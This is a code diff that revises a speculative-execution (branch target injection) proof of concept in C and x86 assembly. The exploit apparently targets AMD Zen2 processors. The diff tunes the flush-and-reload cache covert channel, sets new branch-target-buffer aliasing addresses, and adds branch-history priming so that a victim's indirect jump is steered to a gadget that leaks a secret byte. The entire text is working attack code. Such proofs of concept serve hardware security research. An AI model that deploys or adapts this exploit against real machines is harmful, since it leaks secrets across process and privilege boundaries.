@@ -24,7 +24,8 @@ enum training_mode {
 /* The rdtscp in itself takes about 60 cycles on Zen2 */
 #define CACHE_HIT_THRESHOLD 80
 /* Covert channel */
-#define ELEMENT_PADDING (512)
+#define STRIDE_BITS 9
+#define ELEMENT_PADDING 1<<STRIDE_BITS
 /* The number of characters in the ASCII space */
 #define NUM_ELEMENTS 256
 uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];
@@ -50,7 +51,7 @@ void malicious_target();
       "movq (%rax), %rbx\n"
       /* When specualting, stop here. */
       "lfence\n"
-      "ret\n"
+      "jmp flush\n"
  );
 
 void benign_target();
@@ -58,12 +59,12 @@ asm (
   "benign_target:\n"
   /* Stop here on speculation to prevent any other side effects. */
   "lfence\n"
-  "ret\n"
+  "jmp measure\n"
 );
 
 /* These two addresses are carefully chosen to alias in the BTB. */
 #define VICTIM_BRANCH_ADDRESS 0x41bababababf
-#define ATTACKER_BRANCH_ADDRESS 0x41aaba3a9ae2
+#define ATTACKER_BRANCH_ADDRESS 0x41b2ba3abae1
 
 void flush();
 void measure();
@@ -77,9 +78,8 @@ void victim_insns__end();
 asm (
   ".align 0x80000\n"
   "victim_insns:\n"
-  "call *(%r11)\n"
-
-  "ret\n"
+  NOPS_str(0x21)
+  "jmp *(%r11)\n"
   "victim_insns__end:\n"
 );
 
@@ -88,11 +88,21 @@ void attacker_insns__end();
 asm (
   ".align 0x80000\n"
   "attacker_insns:\n"
-  "call *(%r11)\n"
-  NOPS_str(0x40)
-  "ret\n"
+  NOPS_str(0x21)
+  "jmp *(%r11)\n"
   "attacker_insns__end:\n"
 );
+
+
+void branch_history_target();
+asm (
+".align 0x2000\n"
+"branch_history_target:\n"
+"ret\n"
+);
+
+#define BRANCH_HISTORY_STEPS 33
+
 
 static inline void flush_covert_channel() {
   for (int i = 0; i < NUM_ELEMENTS; i++)
@@ -105,7 +115,11 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
   int hits[NUM_ELEMENTS];
   int winner, runner_up;
 
-  uint8_t saved_first_byte_malicious_target = *(uint8_t *)(malicious_target);
+  uint64_t branch_history[BRANCH_HISTORY_STEPS] = {(uint64_t)branch_history_target};
+
+  for (int i = 0; i < BRANCH_HISTORY_STEPS; i++)
+    branch_history[i] = (uint64_t)branch_history_target;
+
   enum training_mode training_sequence[6] = {TRAIN};
   training_sequence[5] = ATTACK;
 
@@ -121,7 +135,7 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
     /* Clear the cache so that a hit in the covert channel is
      * can be measured as a side channel.
      */
-    flush_covert_channel();
+    flush_range((uint64_t)covert_channel, 1<<STRIDE_BITS, NUM_ELEMENTS);
 
     for (int i = 0; i < 6; i++) {
         if (training_sequence[i] == ATTACK) {
@@ -130,13 +144,12 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
            * changed back to the original byte so that the secret dependent load
            * can be executed speculatively.
            */
-          *(uint8_t *)(malicious_target) = saved_first_byte_malicious_target;
           target = benign_target;
         } else {
           /* During the training phase, `malicious_target` is executed
            * architecturally, so the first byte is replaced with a `RET`.
            */
-          *(uint8_t *)(malicious_target) = RET;
+          // *(uint8_t *)(malicious_target) = RET;
           target = malicious_target;
         }
 
@@ -155,25 +168,31 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
          */
         "mov (%[pointer_to_target]), %%r11\n"
         /* create some execution history for the TAGE predictions */
-        "push %[label]\n"
         "push %[icall]\n"
-        "movl $1, %%r8d\n"
-        "jmp .L2\n"
-        ".L3:\n"
-        "addl $1, %%r8d\n"
-        ".L2:\n"
-        "cmpl $100, %%r8d\n"
-        "jle .L3\n"
+        "mov %[branch_history], %%r10 \n\t"
+        // build an execution path to prime some history
+        ".rept " xstr(BRANCH_HISTORY_STEPS) "\n\t"
+        "pushq (%%r10)\n\t"
+        "add $8, %%r10\n\t"
+        ".endr\n\t"
+
+        // "movl $1, %%r8d\n"
+        // "jmp .L2\n"
+        // ".L3:\n"
+        // "addl $1, %%r8d\n"
+        // ".L2:\n"
+        // "cmpl $100, %%r8d\n"
+        // "jle .L3\n"
         "ret\n"
         : /* No output operands */
         : [pointer_to_target] "r"(&pointer_to_target),
           [leak_addr] "r"(training_sequence[i] == TRAIN ? dummy : secret_addr),
           [covert_channel] "r"(covert_channel),
-          [label] "r" (training_sequence[i] == TRAIN ? flush : measure),
+          [branch_history] "r" (branch_history),
           [icall] "r" (training_sequence[i] == TRAIN ? VICTIM_BRANCH_ADDRESS : VICTIM_BRANCH_ADDRESS)
         : "rax", "rdi", "rsi", "r11", "rax");
         asm("flush:\n");
-        flush_covert_channel();
+        flush_range((uint64_t)covert_channel, 1<<STRIDE_BITS, NUM_ELEMENTS);
         continue;
     }
 
